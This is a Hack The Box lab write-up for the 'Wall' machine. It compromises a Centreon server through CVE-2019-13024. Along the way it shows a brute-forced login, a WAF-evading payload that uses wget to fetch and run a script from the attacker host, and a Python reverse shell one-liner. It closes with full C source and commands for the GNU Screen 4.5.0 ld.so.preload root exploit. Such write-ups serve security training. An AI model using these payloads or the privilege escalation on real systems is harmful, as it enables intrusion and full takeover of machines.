---
layout: single
title: Wall - Hack The Box
excerpt: "Wall is running a vulnerable version of the Centreon application that allows authenticated users to gain RCE. The tricky part of this box was finding the path to the application since it's not something that normally shows up in the wordlists I use with gobuster. The intended way was to bypass the HTTP basic auth by using a POST then the redirection contained a link to the centreon page but instead I did some recon on the box creator's website and saw that he had written an exploit for Centreon and guessed the path accordingly. The priv esc was the same used on Flujab: a vulnerability in screen that allows the attacker to write to any file on the system."
date: 2019-12-07
classes: wide
header:
  teaser: /assets/images/htb-writeup-wall/wall_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - linux
  - centreon
  - screen
  - waf
  - centreon
  - CVE-2019-13024
---

![](/assets/images/htb-writeup-wall/wall_logo.png)

Wall is running a vulnerable version of the Centreon application that allows authenticated users to gain RCE. The tricky part of this box was finding the path to the application since it's not something that normally shows up in the wordlists I use with gobuster. The intended way was to bypass the HTTP basic auth by using a POST then the redirection contained a link to the centreon page but instead I did some recon on the box creator's website and saw that he had written an exploit for Centreon and guessed the path accordingly. The priv esc was the same used on Flujab: a vulnerability in screen that allows the attacker to write to any file on the system.

## Summary

- There's a Centreon application running that is vulnerable to `CVE-2019-13024`
- We can guess or bruteforce the password and then execute the exploit
- The exploit needs to be modified because there is a WAF configured on the server
- Once we get a shell, we find a version of `screen` that is vulnerable to a root privesc exploit

## Tools, Exploits & Blogs used

- [POC for Centreon v19.04 Remote Code Execution CVE-2019-13024](https://github.com/mhaskar/CVE-2019-13024)
- [GNU Screen 4.5.0 - Local Privilege Escalation](https://www.exploit-db.com/exploits/41154)

## Portscan

```
# nmap -sC -sV -p- 10.10.10.157
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-06 11:54 EST
Nmap scan report for 10.10.10.157
Host is up (0.027s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2e:93:41:04:23:ed:30:50:8d:0d:58:23:de:7f:2c:15 (RSA)
|   256 4f:d5:d3:29:40:52:9e:62:58:36:11:06:72:85:1b:df (ECDSA)
|_  256 21:64:d0:c0:ff:1a:b4:29:0b:49:e1:11:81:b6:73:66 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.93 seconds
```

## Website enumeration

The webserver has the default page for Ubuntu.

![](/assets/images/htb-writeup-wall/Screenshot_1.png)

Maybe we need to use `wall.htb` as vhost but I get the same page when I put that in my `/etc/hosts`. There might be other vhosts that I need to fuzz but for now I'll start with gobuster to find interesting files.

```
# gobuster dir -q -w /opt/SecLists/Discovery/Web-Content/big.txt -x php -b 403,404 -u http://10.10.10.157
/aa.php (Status: 200)
/monitoring (Status: 401)
/panel.php (Status: 200)
```

Both PHP files don't appear to contain anything interesting:

![](/assets/images/htb-writeup-wall/Screenshot_2.png)

![](/assets/images/htb-writeup-wall/Screenshot_3.png)

The `/monitoring` URI requires HTTP basic authentication:

![](/assets/images/htb-writeup-wall/Screenshot_4.png)

## Enumeration fails

Here's a list of various things I tried next but didn't return anything useful:
- Brute force the `/monitoring` page with hydra using admin as username and partial rockyou wordlist
- Fuzzing possible parameters on the `aa.php` and `panel.php` page
- Fuzzing vhosts for `FUZZ.wall.htb` and `FUZZ.htb`
- Fuzzing different User-Agent headers in HTTP request
- Ran Nikto to look for things I might have missed
- Ran gobuster again with a long list of extensions and multiple wordlists

I did however notice that when I send a POST request with `nc`, `hostname` or `passwd` in the payload I get a 403 so this indicates there is probably a WAF running on this machine.

![](/assets/images/htb-writeup-wall/Screenshot_5.png)

## Recon

I checked out the [box creator's github repo](https://github.com/mhaskar?) and I found a couple of exploits he wrote for various software.

There's a Centreon exploit on his site so I tried `/centreon` and was able to get a valid page:

![](/assets/images/htb-writeup-wall/Screenshot_6.png)

After I finished the box I went back and tried to find the intended way and found that a POST request is not authenticated and I can see the redirection link:

![](/assets/images/htb-writeup-wall/Screenshot_14.png)

There's a CSRF token on the login page so it'll make brute forcing a bit more complicated:

![](/assets/images/htb-writeup-wall/Screenshot_7.png)

I ran gobuster against the `/centreon` page and I found an API directory:

```
# gobuster dir -q -w /opt/SecLists/Discovery/Web-Content/big.txt -b 403,404 -u http://10.10.10.157/centreon
/Themes (Status: 301)
/api (Status: 301)
/class (Status: 301)
```

## Exploiting Centreon

According to the [Centreon's API documentation](https://documentation.centreon.com/docs/centreon/en/latest/api/api_rest/index.html), we can can log in with the following:

![](/assets/images/htb-writeup-wall/Screenshot_8.png)

The login API seems to work:

```
# curl -XPOST -d 'username=user&password=pass' 10.10.10.157/centreon/api/index.php?action=authenticate
"Bad credentials"
```

Next, I'll use wfuzz with a wordlist to bruteforce a valid login:

```
# wfuzz -w /opt/SecLists/Passwords/Leaked-Databases/rockyou-10.txt --hs 'Bad credentials' -XPOST -d 'username=admin&password=FUZZ' http://10.10.10.157/centreon/api/index.php?action=authenticate

********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://10.10.10.157/centreon/api/index.php?action=authenticate
Total requests: 92

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000027:   200        0 L      1 W      60 Ch       "password1"

Total time: 2.605513
Processed Requests: 92
Filtered Requests: 91
Requests/sec.: 35.30973
```

Hahaha, I should have tested this simple password before bruteforcing the login.

I can login to the Centreon app with `admin` / `password1`:

![](/assets/images/htb-writeup-wall/Screenshot_9.png)

The version is probably vulnerable to CVE-2019-13024 since it's running verison 19.04.0:

![](/assets/images/htb-writeup-wall/Screenshot_10.png)

I tried getting a reverse shell with the following but that didn't work:

```
# python Centreon-exploit.py http://10.10.10.157/centreon admin password1 10.10.14.19 4444
[+] Retrieving CSRF token to submit the login form
[+] Login token is : 86c1c3f00327a8b146385ebc0ca23bde
[+] Logged In Sucssfully
[+] Retrieving Poller token
[+] Poller token is : 0e9822c471232e62c101655d120676b6
[+] Injecting Done, triggering the payload
[+] Check your netcat listener !
```

The WAF might be preventing the exploit from working. I modified the exploit to add debugging and display the xml message

![](/assets/images/htb-writeup-wall/Screenshot_11.png)

Now I'm seeing that it's trying to execute `id%2523` but it not's configured in my exploit payload so maybe the WAF filtered out my payload.

![](/assets/images/htb-writeup-wall/Screenshot_12.png)

After a bit of trial an error I found that the following payload goes through the WAF:

`"nagios_bin": "wget${IFS}-O${IFS}/tmp/test.py${IFS}http://10.10.14.19/test.py;python${IFS}/tmp/test.py"`

I setup my `test.py` to contain a standard python reverse shell (since nc / ncat wasn't installed on the target box):

`import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.19",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);`

![](/assets/images/htb-writeup-wall/Screenshot_13.png)

```
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data),6000(centreon)
```

## Privesc

When I was checking for SUID files, I spotted something odd: The screen binary has been renamed to include the version number so this looks like a hint to me. I remember on the Flujab box that they used the same priv esc method.

```
$ find / -perm /4000 2>/dev/null
/bin/mount
/bin/ping
/bin/screen-4.5.0
[...]
```

This particular version of the `screen` software opens the logfile with full root privileges so it's possible to write any file anywhere on the system. In a nutshell, the priv esc is:

1. Compile `/tmp/rootshell`, a binary that simply spawns /bin/sh as user root
2. Compile `/tmp/libhax.so`, a shared library that will be loaded by `screen` as root. It chmods my `rootshell` binary to make it run as root.
3. Run screen and overwrite `/etc/ld.so.preload` to include the shared library `/tmp/libhax.so`
4. Run screen gain, this will load the shared library and execute the code
5. Now, the rootshell binary is SUID root and we can run it to get root access

```
$ cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
} 
> EOF

$ gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
$ rm -f /tmp/libhax.c
```

```
$ cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
$ gcc -o /tmp/rootshell /tmp/rootshell.c
$ rm -f /tmp/rootshell.c
```

```
$ cd /etc
$ umask 000
$ /bin/screen-4.5.0 -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
$ /bin/screen-4.5.0 -ls
[+] done!
No Sockets found in /tmp/screens/S-www-data.

$ /tmp/rootshell
id
uid=0(root) gid=0(root) groups=0(root),33(www-data),6000(centreon)
```

Now that I'm root I can grab both flags at the same time.

```
cat /root/root.txt
1fdbcf8c...

cat /home/shelby/user.txt
fe619454...
```